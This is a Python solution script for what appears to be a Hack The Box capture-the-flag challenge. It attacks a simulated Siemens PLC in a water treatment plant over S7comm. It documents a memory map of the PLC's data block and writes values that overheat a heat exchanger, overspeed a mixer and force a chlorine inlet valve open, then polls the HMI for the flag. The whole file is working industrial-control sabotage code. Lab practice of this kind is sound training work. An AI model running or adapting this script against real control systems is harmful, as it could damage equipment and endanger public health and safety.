#!/usr/bin/env python3
"""
HTB Challenge: Flow Override - S7comm Water Treatment Plant Attack
Flag: HTB{d4t4bl0ck_dr1v3n_d0m1n4t10n}

Target: Siemens PLC using S7comm protocol
- Port 30859: Web HMI (HTTP) showing plant status
- Port 32511: S7comm (PLC communication)

Objective: Disrupt at least 3 pieces of equipment simultaneously.

Equipment:
- Water Tank (In-Water Tank)
- Chlorine Tank
- Heat Exchanger
- Mixer Tank
- Storage Tank

Attack strategy:
1. Connect to PLC via S7comm on port 32511 using python-snap7
2. Read DB1 (Data Block 1) which contains all process variables
3. Manipulate specific offsets to cause 3 simultaneous faults:
   - Heat Exchanger "over heat": Write 500 to offset 48-49 (hot side temp)
   - Mixer "over speed": Write 255 to offset 33 (mixing speed)
   - Chlorine Tank "over flow": Enable manual mode (offset 4=1) and
     force chlorine_in_valve ON (offset 81=1) during mixing cycle

DB1 Memory Map (key offsets):
  Offset 4:     manual_mode (0=OFF, 1=ON)
  Offset 20:    water_tank_in_valve
  Offset 33:    mixer_mixing_speed (default: 50)
  Offset 38-39: mixer_mixing_duration (default: 20)
  Offset 48-49: heatexch_hot_side_temp (int16 BE, default: 62)
  Offset 62:    heatexch_hot_side_valve
  Offset 63:    heatexch_cold_side_valve
  Offset 81:    chlorine_tank_in_valve
  Offset 82:    chlorine_tank_out_valve
"""

import snap7
import json
import urllib.request
import time
import struct

HOST = "154.57.164.79"
PORT = 32511
WEB_PORT = 30859

def get_status():
    resp = urllib.request.urlopen(f"http://{HOST}:{WEB_PORT}/status", timeout=5)
    return json.loads(resp.read())

def main():
    client = snap7.Client()
    client.connect(HOST, 0, 1, PORT)

    def write_byte(offset, value):
        client.db_write(1, offset, bytearray([value]))

    def write_int16(offset, value):
        client.db_write(1, offset, bytearray(struct.pack('>H', value)))

    # Reset DB1 to defaults
    data = bytearray(100)
    data[33] = 50
    data[39] = 20
    data[49] = 62
    data[62] = 1
    data[63] = 1
    data[80] = 1
    client.db_write(1, 0, data)
    time.sleep(5)

    # Phase 1: Overheat the heat exchanger
    write_int16(48, 500)
    for i in range(20):
        write_int16(48, 500)
        time.sleep(1)
        s = get_status()
        if s['heatexch_status'] != "healthy":
            print(f"Heat exchanger: {s['heatexch_status']}")
            break

    # Phase 2: Wait for mixer cycle, attack all 3 simultaneously
    was_mixing = False
    for iteration in range(400):
        write_int16(48, 500)
        write_byte(33, 255)

        s = get_status()
        faulty = [e for e in ['water_tank_status', 'chlorine_tank_status', 'mixer_status',
                               'heatexch_status', 'storage_tank_status'] if s[e] != "healthy"]

        if s['mixer_start_mixing'] and not was_mixing:
            was_mixing = True
            write_byte(4, 1)
            write_byte(81, 1)

        if s['mixer_start_mixing']:
            write_byte(4, 1)
            write_byte(81, 1)

        if not s['mixer_start_mixing'] and was_mixing:
            was_mixing = False

        if s.get('flag') and s['flag'] != "":
            print(f"\nFLAG: {s['flag']}")
            break

        if len(faulty) >= 3:
            print(f"3 faults achieved: {faulty}")
            for _ in range(30):
                time.sleep(1)
                s = get_status()
                if s.get('flag') and s['flag'] != "":
                    print(f"\nFLAG: {s['flag']}")
                    break
            break

        time.sleep(0.5)

    client.disconnect()

if __name__ == "__main__":
    main()
